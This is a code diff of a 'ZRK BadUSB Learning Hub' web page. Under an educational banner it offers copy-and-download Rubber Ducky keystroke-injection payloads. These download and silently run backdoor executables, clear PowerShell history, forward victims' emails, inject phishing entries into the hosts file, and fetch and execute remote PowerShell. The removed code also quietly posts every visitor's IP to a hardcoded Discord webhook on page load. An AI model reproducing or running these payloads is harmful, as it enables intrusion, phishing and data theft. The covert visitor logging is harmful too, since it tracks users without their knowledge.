-STRING Invoke-WebRequest -Uri "https://example.com/backdoor1.exe" -OutFile "$env:TEMP\\backdoor1.exe"
-ENTER
-STRING Start-Process "$env:TEMP\\backdoor1.exe" -WindowStyle Hidden
-ENTER
-STRING Invoke-WebRequest -Uri "https://example.com/backdoor2.ps1" -OutFile "$env:TEMP\\backdoor2.ps1"
-ENTER
-STRING powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\backdoor2.ps1"
-ENTER
-
-REM Clean up traces
-STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
-ENTER
-STRING Clear-History
-ENTER
-STRING exit
-ENTER`
-            },
-            // Add more attack objects here...
-        ];
-
-        const newsItems = [
-            {
-                title: "ZRK Security Discovers New USB Vulnerability",
-                content: "Our research team has uncovered a critical vulnerability in USB protocol implementation that could allow attackers to gain system-level access. We're working with manufacturers to address this issue.",
-                fullArticle: "The newly discovered vulnerability, dubbed 'USBygone', exploits a flaw in the way operating systems handle certain USB device descriptors. This could potentially allow an attacker to execute arbitrary code with system privileges simply by plugging in a malicious USB device. Our team is currently developing a proof-of-concept exploit to demonstrate the severity of this issue to manufacturers and OS developers. We urge all users to exercise caution when connecting unknown USB devices and to keep their systems updated with the latest security patches."
-            },
-            {
-                title: "ZRK Releases New BadUSB Detection Tool",
-                content: "We're excited to announce the release of our new open-source tool, 'USBGuardian', designed to detect and prevent BadUSB attacks in real-time.",
-                fullArticle: "USBGuardian leverages machine learning algorithms to analyze USB device behavior and identify potential threats. The tool monitors USB traffic patterns, device fingerprints, and system interactions to detect anomalies that could indicate a BadUSB attack. Key features include real-time threat alerts, customizable security policies, and detailed logging for forensic analysis. USBGuardian is now available on our GitHub repository, and we encourage security professionals and enthusiasts to contribute to its development and help improve USB security for everyone."
-            },
-            {
-                title: "ZRK to Host Virtual BadUSB Workshop",
-                content: "Join us next month for a comprehensive virtual workshop on BadUSB techniques, defense strategies, and the latest developments in USB security.",
-                fullArticle: "The two-day workshop will cover a wide range of topics, including BadUSB attack vectors, hardware-based USB security solutions, and emerging trends in USB exploitation. Participants will have the opportunity to engage in hands-on labs, where they'll learn to create and detect various types of BadUSB payloads. Our team of expert researchers will also share insights on the future of USB security and discuss potential advancements in attack and defense techniques. Registration is now open on our website, with early bird discounts available until the end of this week."
-            }
-            // Add more news items as needed
-        ];
-
-        const categories = [...new Set(attacks.map(attack => attack.category))];
-
-        function createAttackItem(attack) {
-            const item = document.createElement('div');
-            item.className = 'attack-item';
-            if (attack.name === "ZRK NoEscape") {
-                item.classList.add('zrk-noescape');
-            }
-            item.innerHTML = `
-                <div class="attack-header">
-                    <h2 class="attack-name">${attack.name}</h2>
-                    <span class="attack-category">${attack.category}</span>
-                </div>
-                <div class="attack-content">
-                    <p class="attack-description">${attack.description}</p>
-                    <pre class="attack-code"><code>${attack.code}</code></pre>
-                    <button class="copy-btn">Copy</button>
-                    <button class="download-btn">Download</button>
-                </div>
-            `;
-            return item;
-        }
-
-        function displayAttacks(filteredAttacks = attacks) {
-            const attackList = document.getElementById('attackList');
-            attackList.innerHTML = '';
-            filteredAttacks.forEach(attack => {
-                attackList.appendChild(createAttackItem(attack));
-            });
-        }
-
-        function filterAttacks() {
-            const searchTerm = document.getElementById('search').value.toLowerCase();
-            const filteredAttacks = attacks.filter(attack => 
-                attack.name.toLowerCase().includes(searchTerm) || 
-                attack.description.toLowerCase().includes(searchTerm) ||
-                attack.category.toLowerCase().includes(searchTerm)
-            );
-            displayAttacks(filteredAttacks);
-        }
-
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                alert('Code copied to clipboard!');
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
-            });
-        }
-
-        function downloadScript(filename, text) {
-            const element = document.createElement('a');
-            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
-            element.setAttribute('download', filename);
-            element.style.display = 'none';
-            document.body.appendChild(element);
-            element.click();
-            document.body.removeChild(element);
-        }
-
-        function createNewsItem(news) {
-            const item = document.createElement('div');
-            item.className = 'news-item';
-            item.innerHTML = `
-                <h3>${news.title}</h3>
-                <p>${news.content}</p>
-                <a href="#" class="read-more">Read more</a>
-                <div class="full-article">${news.fullArticle}</div>
-            `;
-            return item;
-        }
-
-        function displayNews() {
-            const newsContent = document.getElementById('newsContent');
-            newsContent.innerHTML = '';
-            newsItems.forEach(news => {
-                newsContent.appendChild(createNewsItem(news));
-            });
-        }
-
-        document.getElementById('search').addEventListener('input', filterAttacks);
-
-        categories.forEach(category => {
-            const button = document.createElement('button');
-            button.textContent = category;
-            button.className = 'category';
-            button.addEventListener('click', () => {
-                const filteredAttacks = attacks.filter(attack => attack.category === category);
-                displayAttacks(filteredAttacks);
-            });
-            document.getElementById('categories').appendChild(button);
-        });
-
-        document.getElementById('attackList').addEventListener('click', (e) => {
-            if (e.target.classList.contains('copy-btn')) {
-                const code = e.target.previousElementSibling.textContent;
-                copyToClipboard(code);
-            } else if (e.target.classList.contains('download-btn')) {
-                const code = e.target.previousElementSibling.previousElementSibling.textContent;
-                const filename = e.target.closest('.attack-item').querySelector('.attack-name').textContent + '.txt';
-                downloadScript(filename, code);
-            }
-        });
-
-        document.getElementById('downloadAllBtn').addEventListener('click', () => {
-            const zip = new JSZip();
-            attacks.forEach(attack => {
-                zip.file(attack.name + '.txt', attack.code);
-            });
-            zip.generateAsync({type:"blob"}).then(function(content) {
-                saveAs(content, "all_scripts.zip");
-            });
-        });
-
-        let isDragging = false;
-        let startX, startY, startLeft, startBottom;
-
-        document.getElementById('newsBtn').addEventListener('click', () => {
-            document.getElementById('newsPopup').style.display = 'block';
-            displayNews();
-        });
-
-        document.getElementById('newsHeader').addEventListener('mousedown', (e) => {
-            isDragging = true;
-            startX = e.clientX;
-            startY = e.clientY;
-            startLeft = parseInt(document.getElementById('newsPopup').style.left) || 20;
-            startBottom = parseInt(document.getElementById('newsPopup').style.bottom) || 100;
-        });
-
-        document.addEventListener('mousemove', (e) => {
-            if (!isDragging) return;
-            const dx = e.clientX - startX;
-            const dy = e.clientY - startY;
-            const newsPopup = document.getElementById('newsPopup');
-            newsPopup.style.left = `${startLeft + dx}px`;
-            newsPopup.style.bottom = `${startBottom - dy}px`;
-        });
-
-        document.addEventListener('mouseup', () => {
-            isDragging = false;
-        });
-
-        document.getElementById('newsClose').addEventListener('click', () => {
-            document.getElementById('newsPopup').style.display = 'none';
-        });
-
-        document.getElementById('newsMinimize').addEventListener('click', () => {
-            const newsPopup = document.getElementById('newsPopup');
-            newsPopup.style.height = newsPopup.style.height === '40px' ? '600px' : '40px';
-        });
-
-        document.getElementById('newsMaximize').addEventListener('click', () => {
-            const newsPopup = document.getElementById('newsPopup');
-            if (newsPopup.style.width === '100%') {
-                newsPopup.style.width = '400px';
-                newsPopup.style.height = '600px';
-                newsPopup.style.top = '';
-                newsPopup.style.left = '20px';
-                newsPopup.style.right = '';
-                newsPopup.style.bottom = '100px';
-            } else {
-                newsPopup.style.width = '100%';
-                newsPopup.style.height = '100%';
-                newsPopup.style.top = '0';
-                newsPopup.style.left = '0';
-                newsPopup.style.right = '0';
-                newsPopup.style.bottom = '0';
-            }
-        });
-
-        document.getElementById('newsContent').addEventListener('click', (e) => {
-            if (e.target.classList.contains('read-more')) {
-                e.preventDefault();
-                const fullArticle = e.target.nextElementSibling;
-                fullArticle.style.display = fullArticle.style.display === 'none' ? 'block' : 'none';
-                e.target.textContent = fullArticle.style.display === 'none' ? 'Read more' : 'Read less';
-            }
-        });
-
-        let isDarkMode = true;
-
-        document.getElementById('toggleMode').addEventListener('click', () => {
-            document.body.classList.toggle('light-mode');
-            isDarkMode = !isDarkMode;
-            document.getElementById('toggleMode').textContent = isDarkMode ? '🌓' : '🌞';
-        });
-
-        document.getElementById('docBtn').addEventListener('click', () => {
-            document.getElementById('docOverlay').style.display = 'block';
-            loadDocumentation();
-        });
-
-        document.getElementById('closeDocBtn').addEventListener('click', () => {
-            document.getElementById('docOverlay').style.display = 'none';
-        });
-
-        function loadDocumentation() {
-            const docContent = document.getElementById('docContent');
-            docContent.innerHTML = `
-                <h1>ZRK BadUSB Documentation</h1>
-                <p>Welcome to the comprehensive documentation for ZRK BadUSB techniques and defenses. This guide is intended for educational and research purposes only. Misuse of this information is strictly prohibited.</p>
-                
-                <h2>Table of Contents</h2>
-                <ol>
-                    <li><a href="#introduction">Introduction to BadUSB</a></li>
-                    <li><a href="#techniques">Common BadUSB Techniques</a></li>
-                    <li><a href="#defenses">Defensive Strategies</a></li>
-                    <li><a href="#research">ZRK's Ongoing Research</a></li>
-                    <li><a href="#ethics">Ethical Considerations</a></li>
-                </ol>
-
-                <h2 id="introduction">Introduction to BadUSB</h2>
-                <p>BadUSB refers to a class of attacks that exploit the trust between a computer and a USB device. These attacks can reprogram USB devices to emulate keyboards, network cards, or other trusted devices, allowing for various malicious activities.</p>
-
-                <h2 id="techniques">Common BadUSB Techniques</h2>
-                <ul>
-                    <li>Keystroke Injection: Simulates keyboard input to execute commands or type malicious payloads.</li>
-                    <li>Payload Execution: Runs malicious scripts or programs on the target system.</li>
-                    <li>Data Exfiltration: Steals sensitive data from the target system.</li>
-                    <li>Network Manipulation: Alters network settings or establishes unauthorized connections.</li>
-                </ul>
-
-                <h2 id="defenses">Defensive Strategies</h2>
-                <ul>
-                    <li>USB Port Control: Implement strict policies on USB device usage.</li>
-                    <li>Device Whitelisting: Allow only approved USB devices to connect.</li>
-                    <li>Endpoint Protection: Use advanced security software to detect and prevent BadUSB attacks.</li>
-                    <li>User Training: Educate users about the risks of connecting unknown USB devices.</li>
-                </ul>
-
-                <h2 id="research">ZRK's Ongoing Research</h2>
-                <p>At ZRK, we're constantly pushing the boundaries of USB security research. Our current focus areas include:</p>
-                <ul>
-                    <li>Advanced BadUSB Detection Algorithms</li>
-                    <li>Hardware-based USB Security Solutions</li>
-                    <li>Machine Learning for USB Threat Analysis</li>
-                    <li>Quantum-Resistant USB Communication Protocols</li>
-                </ul>
-
-                <h2 id="ethics">Ethical Considerations</h2>
-                <p>The knowledge and techniques discussed in this documentation are powerful and potentially dangerous. It is crucial to approach this field with a strong ethical foundation:</p>
-                <ul>
-                    <li>Always obtain explicit permission before testing on any system or network.</li>
-                    <li>Use your knowledge to improve security, not to cause harm or damage.</li>
-                    <li>Share your findings responsibly through proper disclosure channels.</li>
-                    <li>Stay informed about relevant laws and regulations in your jurisdiction.</li>
-                </ul>
-
-                <p>Remember, with great power comes great responsibility. Use your skills ethically and contribute to a safer digital world.</p>
-            `;
-        }
-
-        displayAttacks();
-    </script>
-
-    <!-- New webhook script -->
-    <script>
-        // Function to get the visitor's IP address
-        async function getIPAddress() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
-
-        // Function to send webhook notification
-        async function sendWebhookNotification() {
-            const ip = await getIPAddress();
-            const visitorCount = localStorage.getItem('visitorCount') || 0;
-            const newVisitorCount = parseInt(visitorCount) + 1;
-            localStorage.setItem('visitorCount', newVisitorCount);
-
-            const webhookUrl = 'https://discord.com/api/webhooks/1281042771054039103/86TnW0wr5IZo3Y9q4P5M3Gbu5dzQXKvzKWEbpd_cgO4SECLvs96bQrNP00gx2ZHHFocC';
-            const message = {
-                content: `New visitor to ZRK BadUSB Learning Hub! IP: ${ip} (Visitor #${newVisitorCount})`
+            const handleCopy = () => {
+                navigator.clipboard.writeText(scriptContent)
+                    .then(() => alert(`Copied ${scriptName} to clipboard`))
+                    .catch(err => console.error('Failed to copy: ', err));
             };
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
+            const handleDownload = () => {
+                if (window.confirm(`Are you sure you want to download "${scriptName}"? This script may be potentially harmful.`)) {
+                    const newDownload = { scriptName, date: new Date().toLocaleString() };
+                    setDownloadHistory(prevHistory => [...prevHistory, newDownload]);
+                    
+                    const blob = new Blob([scriptContent], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${scriptName}.txt`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }
+            };
+
+            return (
+                <div className="badusb-card">
+                    <h3>{scriptName}</h3>
+                    <p className="category">{category}</p>
+                    <div className="script-content">
+                        <pre>{expanded ? scriptContent : `${scriptContent.slice(0, 100)}...`}</pre>
+                        <button onClick={() => setExpanded(!expanded)}>
+                            {expanded ? 'Show Less' : 'Show More'}
+                        </button>
+                    </div>
+                    <div className="card-buttons">
+                        <button onClick={handleCopy}>Copy</button>
+                        <button onClick={handleDownload}>Download</button>
+                    </div>
+                </div>
+            );
+        };
+
+        const HistorySection = ({ downloadHistory }) => {
+            return (
+                <div className="history-section">
+                    <h2>Download History</h2>
+                    <ul>
+                        {downloadHistory.map((download, index) => (
+                            <li key={index}>
+                                {download.scriptName} - {download.date}
+                            </li>
+                        ))}
+                    </ul>
+                </div>
+            );
+        };
+
+        const SettingsSection = () => {
+            const [settings, setSettings] = useState(() => {
+                const savedSettings = localStorage.getItem('zrkBadUSBSettings');
+                return savedSettings ? JSON.parse(savedSettings) : {
+                    darkMode: false,
+                    showNotifications: true,
+                    twoFactorAuth: false,
+                    autoLogout: false,
+                    animationSpeed: 50,
+                    fontSize: 16,
+                    accentColor: '#ff9800',
+                    sidebarWidth: 80,
+                    gradientColor1: '#4caf50',
+                    gradientColor2: '#2196f3',
+                    userName: 'User' // Add this line
+                };
             });
-        }
 
-        // Call the function when the page loads
-        window.addEventListener('load', sendWebhookNotification);
-    </script>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FAQ - BadUSB Free Services</title>
-    <style>
-        body {
-            background-color: #1a1a1a;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-        }
-        .faq-item {
-            margin-bottom: 15px;
-        }
-        .faq-question {
-            background-color: #333333;
-            padding: 15px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        .faq-answer {
-            display: none;
-            padding: 15px;
-            background-color: #2a2a2a;
-            border-radius: 0 0 5px 5px;
-        }
-    </style>
-</head>
-<body>
-    <h1>Frequently Asked Questions - BadUSB Free Services</h1>
-    
-    <div class="faq-item">
-        <div class="faq-question">What are BadUSB free services?</div>
-        <div class="faq-answer">BadUSB free services are security measures and tools designed to protect against BadUSB attacks, which exploit vulnerabilities in USB devices. These services help identify, prevent, and mitigate potential threats.</div>
-    </div>
+            useEffect(() => {
+                localStorage.setItem('zrkBadUSBSettings', JSON.stringify(settings));
+                applySettings(settings);
+            }, [settings]);
 
-    <div class="faq-item">
-        <div class="faq-question">How can I protect my devices from BadUSB attacks?</div>
-        <div class="faq-answer">To protect your devices, use our BadUSB detection software, keep your systems updated, disable autorun for USB devices, and only use trusted USB devices. Our free services provide additional layers of protection and guidance.</div>
-    </div>
+            const handleChange = (setting, value) => {
+                setSettings(prev => ({ ...prev, [setting]: value }));
+            };
 
-    <div class="faq-item">
-        <div class="faq-question">Are your BadUSB free services compatible with all operating systems?</div>
-        <div class="faq-answer">Our free services are compatible with most major operating systems, including Windows, macOS, and Linux. Check our compatibility list for specific versions and requirements.</div>
-    </div>
+            const resetSettings = () => {
+                const defaultSettings = {
+                    darkMode: false,
+                    showNotifications: true,
+                    twoFactorAuth: false,
+                    autoLogout: false,
+                    animationSpeed: 50,
+                    fontSize: 16,
+                    accentColor: '#ff9800',
+                    sidebarWidth: 80,
+                    gradientColor1: '#4caf50',
+                    gradientColor2: '#2196f3',
+                    userName: 'User'
+                };
+                setSettings(defaultSettings);
+            };
 
-    <div class="faq-item">
-        <div class="faq-question">How often should I scan my devices for BadUSB threats?</div>
-        <div class="faq-answer">We recommend running a scan at least once a week and immediately after connecting any new or unfamiliar USB devices. Our free service includes automated scheduled scans for your convenience.</div>
-    </div>
+            return (
+                <div className="settings-grid">
+                    <div className="settings-card">
+                        <h3>General Settings</h3>
+                        <label>
+                            <input
+                                type="checkbox"
+                                checked={settings.darkMode}
+                                onChange={(e) => handleChange('darkMode', e.target.checked)}
+                            /> Enable dark mode
+                        </label>
+                        <label>
+                            <input
+                                type="checkbox"
+                                checked={settings.showNotifications}
+                                onChange={(e) => handleChange('showNotifications', e.target.checked)}
+                            /> Show notifications
+                        </label>
+                    </div>
+                    <div className="settings-card">
+                        <h3>Security Settings</h3>
+                        <label>
+                            <input
+                                type="checkbox"
+                                checked={settings.twoFactorAuth}
+                                onChange={(e) => handleChange('twoFactorAuth', e.target.checked)}
+                            /> Enable two-factor authentication
+                        </label>
+                        <label>
+                            <input
+                                type="checkbox"
+                                checked={settings.autoLogout}
+                                onChange={(e) => handleChange('autoLogout', e.target.checked)}
+                            /> Auto-logout after inactivity
+                        </label>
+                    </div>
+                    <div className="settings-card">
+                        <h3>User Settings</h3>
+                        <label>
+                            Your Name:
+                            <input
+                                type="text"
+                                value={settings.userName}
+                                onChange={(e) => handleChange('userName', e.target.value)}
+                            />
+                        </label>
+                    </div>
+                    <div className="settings-card">
+                        <h3>Graphics Settings</h3>
+                        <label>
+                            Animation speed:
+                            <input
+                                type="range"
+                                min="0"
+                                max="100"
+                                value={settings.animationSpeed}
+                                onChange={(e) => handleChange('animationSpeed', parseInt(e.target.value))}
+                            />
+                        </label>
+                        <label>
+                            Font size:
+                            <input
+                                type="number"
+                                min="12"
+                                max="24"
+                                value={settings.fontSize}
+                                onChange={(e) => handleChange('fontSize', parseInt(e.target.value))}
+                            /> px
+                        </label>
+                        <label>
+                            Accent color:
+                            <input
+                                type="color"
+                                value={settings.accentColor}
+                                onChange={(e) => handleChange('accentColor', e.target.value)}
+                            />
+                        </label>
+                        <label>
+                            Sidebar width:
+                            <input
+                                type="range"
+                                min="60"
+                                max="200"
+                                value={settings.sidebarWidth}
+                                onChange={(e) => handleChange('sidebarWidth', parseInt(e.target.value))}
+                            /> px
+                        </label>
+                    </div>
+                    <div className="settings-card">
+                        <h3>Gradient Colors</h3>
+                        <label>
+                            Gradient Color 1:
+                            <input
+                                type="color"
+                                value={settings.gradientColor1}
+                                onChange={(e) => handleChange('gradientColor1', e.target.value)}
+                            />
+                        </label>
+                        <label>
+                            Gradient Color 2:
+                            <input
+                                type="color"
+                                value={settings.gradientColor2}
+                                onChange={(e) => handleChange('gradientColor2', e.target.value)}
+                            />
+                        </label>
+                    </div>
+                    <div className="settings-card">
+                        <h3>Reset Settings</h3>
+                        <button onClick={resetSettings}>Reset Graphics Settings</button>
+                    </div>
+                </div>
+            );
+        };
 
-    <script>
-        const questions = document.querySelectorAll('.faq-question');
-        questions.forEach(question => {
-            question.addEventListener('click', () => {
-                const answer = question.nextElementSibling;
-                answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
+        const applySettings = (settings) => {
+            document.documentElement.style.setProperty('--accent-color', settings.accentColor);
+            document.documentElement.style.setProperty('--sidebar-width', `${settings.sidebarWidth}px`);
+            document.documentElement.style.setProperty('--font-size', `${settings.fontSize}px`);
+            document.documentElement.style.setProperty('--animation-speed', `${settings.animationSpeed / 100}s`);
+            document.documentElement.style.setProperty('--gradient-color-1', settings.gradientColor1);
+            document.documentElement.style.setProperty('--gradient-color-2', settings.gradientColor2);
+            
+            if (settings.darkMode) {
+                document.body.classList.add('dark-mode');
+            } else {
+                document.body.classList.remove('dark-mode');
+            }
+        };
+
+        const ProfileSection = () => {
+            return (
+                <div className="profile-section">
+                    <div className="profile-info">
+                        <h2>John Doe</h2>
+                        <p>Email: john.doe@example.com</p>
+                        <p>Member since: January 1, 2023</p>
+                    </div>
+                    <div className="profile-actions">
+                        <button>Edit Profile</button>
+                        <button>Change Password</button>
+                    </div>
+                </div>
+            );
+        };
+
+        const App = () => {
+            const [activeSection, setActiveSection] = useState('home');
+            const [downloadHistory, setDownloadHistory] = useState([]);
+            const [searchTerm, setSearchTerm] = useState('');
+            const [selectedCategory, setSelectedCategory] = useState('All');
+            const [currentTime, setCurrentTime] = useState(new Date());
+            const [settings, setSettings] = useState(() => {
+                const savedSettings = localStorage.getItem('zrkBadUSBSettings');
+                return savedSettings ? JSON.parse(savedSettings) : {
+                    darkMode: false,
+                    showNotifications: true,
+                    twoFactorAuth: false,
+                    autoLogout: false,
+                    animationSpeed: 50,
+                    fontSize: 16,
+                    accentColor: '#ff9800',
+                    sidebarWidth: 80,
+                    gradientColor1: '#4caf50',
+                    gradientColor2: '#2196f3',
+                    userName: 'User'
+                };
             });
-        });
+
+            useEffect(() => {
+                const timer = setInterval(() => setCurrentTime(new Date()), 60000);
+                return () => clearInterval(timer);
+            }, []);
+
+            const getGreeting = () => {
+                const hour = currentTime.getHours();
+                if (hour < 12) return "Good morning";
+                if (hour < 18) return "Good afternoon";
+                return "Good evening";
+            };
+
+            const badUSBScripts = [
+                { name: 'BadUSB Script 1', content: 'Content for Script 1', category: 'Utility' },
+                { name: 'BadUSB Script 2', content: 'Content for Script 2', category: 'Utility' },
+                { name: 'BadUSB Script 3', content: 'Content for Script 3', category: 'Utility' },
+                { name: 'BadUSB Script 4', content: 'Content for Script 4', category: 'Utility' },
+                { name: 'BadUSB Script 5', content: 'Content for Script 5', category: 'Utility' },
+                { name: 'BadUSB Script 6', content: 'Content for Script 6', category: 'Utility' },
+                { name: 'BadUSB Script 7', content: 'Content for Script 7', category: 'Utility' },
+                { name: 'BadUSB Script 8', content: 'Content for Script 8', category: 'Utility' },
+                { name: 'BadUSB Script 9', content: 'Content for Script 9', category: 'Utility' },
+                { name: 'BadUSB Script 10', content: 'Content for Script 10', category: 'Utility' },
+                { name: 'BadUSB Script 11', content: 'Content for Script 11', category: 'Utility' },
+                { name: 'BadUSB Script 12', content: 'Content for Script 12', category: 'Utility' },
+                { name: 'BadUSB Script 13', content: 'Content for Script 13', category: 'Utility' },
+                { name: 'BadUSB Script 14', content: 'Content for Script 14', category: 'Utility' },
+                { name: 'BadUSB Script 15', content: 'Content for Script 15', category: 'Utility' },
+                { name: 'BadUSB Script 16', content: 'Content for Script 16', category: 'Utility' },
+                { name: 'BadUSB Script 17', content: 'Content for Script 17', category: 'Utility' },
+                { name: 'BadUSB Script 18', content: 'Content for Script 18', category: 'Utility' },
+                { name: 'BadUSB Script 19', content: 'Content for Script 19', category: 'Utility' },
+                { name: 'BadUSB Script 20', content: 'Content for Script 20', category: 'Utility' },
+                { name: 'BadUSB Script 21', content: 'Content for Script 21', category: 'Utility' },
+                { name: 'BadUSB Script 22', content: 'Content for Script 22', category: 'Utility' },
+                { name: 'BadUSB Script 23', content: 'Content for Script 23', category: 'Utility' },
+                { name: 'BadUSB Script 24', content: 'Content for Script 24', category: 'Utility' },
+                { name: 'Forward First Email (Mobile)', content: `REM Forwards the first email in the primary section
+REM Only works for phones. 
+REM Does not work tablets as menu bar stops tabs
+REM GMAIL SHORTCUTS https://support.google.com/mail/answer/6594?co=GENIE.Platform%3DAndroid&hl=en&oco=1
+DELAY 1000
+GUI e
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+REM LOOP FROM HERE
+DELAY 500
+CTRL r
+DELAY 1000
+TAB
+DELAY 500
+SHIFT TAB
+DELAY 500
+BACKSPACE
+DELAY 500
+STRING your@email.com
+CTRL ENTER
+DELAY 1000
+REM Moves to the next email
+RIGHTARROW
+REM GOTO LOOP`, category: 'Utility' },
+                { name: 'Forward First Email (Desktop)', content: `REM Forwards the first email
+DELAY 1000
+GUI e
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+REM LOOP FROM HERE
+DELAY 500
+SHIFT TAB
+DELAY 500
+LEFTARROW
+LEFTARROW
+LEFTARROW
+LEFTARROW
+RIGHTARROW
+RIGHTARROW
+ENTER
+DELAY 500
+STRING your@email.com
+DELAY 500
+SHIFT TAB
+DELAY 500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 500
+REM Moves to the next email
+TAB
+RIGHTARROW
+RIGHTARROW
+LEFTARROW
+ENTER
+REM GOTO LOOP`, category: 'Utility' },
+                { name: 'Modify Hosts File', content: `GUI r
+DELAY 400
+STRING cmd
+DELAY 700
+CTRL SHIFT ENTER
+DELAY 1500
+LEFTARROW
+DELAY 400
+ENTER
+DELAY 700
+STRING echo <YourIP> google.com www.google.com >> C:/Windows/System32/drivers/etc/hosts
+DELAY 400
+ENTER
+DELAY 400
+ALT F4`, category: 'Security' },
+                { name: 'Phishing Host Injection', content: `REM Author: .:Koryusai-Kun:.
+REM Description: Used for phishing, it add's an ip of your choosing to the hosts file on windows
+REM Description: so when the user types into there web browser for example www.facebook.com it
+REM Description: insted of going to the proper ip it gose to the one in the host file your evil one.
+REM Description: you need to add the www. version and with out it as well.
+REM ---[Start CMD as administrator]-----------------------
+GUI
+DELAY 50
+STRING cmd
+DELAY 150
+MENU
+DELAY 75
+STRING a
+ENTER
+DELAY 200
+LEFT
+ENTER
+STRING cls
+ENTER
+REM ---[END]----------------------------------------------
+DELAY 300
+REM ---[Inject into the host file]------------------------
+STRING copy con inject.bat
+ENTER
+STRING SET NEWLINE=^& echo.
+ENTER
+ENTER
+STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
+ENTER
+STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
+ENTER
+ENTER
+STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
+ENTER
+STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
+ENTER
+CONTROL z
+ENTER
+STRING inject.bat
+ENTER
+REM ---[END]----------------------------------------------
+DELAY 200
+STRING exit
+ENTER`, category: 'Security' },
+                { name: 'Play WAV File', content: `REM     Title: Play-WAV
+REM     Author: I am Jakoby
+REM     Description: This payload is meant to play a WAV file hidden. See Play-WAV.ps1 for more details
+REM     Target: Windows 10, 11
+REM     Remeber to replace the link with your link for the intended file to download
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+DELAY 500
+ENTER`, category: 'Prank' },
+                { name: 'Close Windows Script', content: `ESC
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING cd %userprofile%/Downloads
+ENTER
+STRING copy con CW.vbs
+ENTER
+STRING do
+ENTER
+STRING Set objShell = CreateObject("WScript.Shell")
+ENTER
+STRING WScript.Sleep 800
+ENTER
+REM idk PS scrpiting so yeet!
+STRING objShell.SendKeys "^{W} %{f4}"
+ENTER
+STRING loop
+CTRL z
+DELAY 100
+ENTER
+REM insert startup scripting
+STRING start CW.vbs && exit
+ENTER`, category: 'Prank' },
+                { name: 'Automailer', content: `REM Title:          Automailer
+REM Author:	    Ratcode404(.github.io)
+REM Description:    Snaps screen, opens outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1 hour rickroll youtube video once done.
+
+REM Default Delay (350 should be mid-speed)
+DEFAULT_DELAY 350
+
+REM Take screenshot
+SHIFT WINDOWS S
+DELAY 200
+TAB
+DELAY 300
+
+REM Open Outlook (Change E-Mail and text)
+GUI r
+DELAY 100
+STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
+ENTER
+DELAY 500
+STRING Subject goes here.
+TAB
+STRING Hello Ratcode!
+ENTER 
+STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
+ENTER
+STRING xoxo
+
+REM Paste Screenshot in Mail (CTRL V)
+SHIFT INSERT
+DELAY 200
+
+REM Send Mail
+ALT S
+ENTER
+DELAY 200
+
+REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
+GUI r
+DELAY 100
+STRING https://www.youtube.com/watch?v=zL19uMsnpSU
+ENTER
+DELAY 300
+M
+DELAY 200
+F`, category: 'Prank' },
+                { name: 'Broken Capslock', content: `REM Title: Broken capslock
+REM Author: FalsePhilosopher
+REM Target: Win
+REM Props: Hak5 and memes
+REM Version: 1.0
+REM Category: Prank
+REM Selects all words and capitalizes them, works best when in a word doc
+DELAY 300
+CTRL+A
+DELAY 500
+SHIFT+F3`, category: 'Prank' },
+                { name: 'Broken Capslock (Save)', content: `REM Title: Broken capslock
+REM Author: FalsePhilosopher
+REM Target: Win
+REM Props: Hak5 and memes
+REM Version: 1.0
+REM Category: Prank
+REM Selects all words and capitalizes them, works best when in a word doc. This version saves it.
+DELAY 300
+CTRL+A
+DELAY 500
+SHIFT+F3
+DELAY 500
+CTRL+S`, category: 'Prank' },
+                { name: 'Cartman Spam', content: `REM ---------CARTMAN SPAM----------
+REM -- by Mr-Savag3 --- 09162022 --
+REM -- updated to 1 line by -------
+REM ---------------- I Am Jakoby --
+REM 
+REM DISCLAIMER: While this Ducky file doesn't really do anything illegal, you still shouldn't use it on anyone besides your friends and family.
+REM I am not responsible for any trouble you get in.
+REM 
+REM INSTRUCTIONS: Requires PC running Windows 10/11. Probably will work on The Lord's OS, Windows 7, but I haven't tested it.
+DELAY 1000
+GUI r
+DELAY 1500
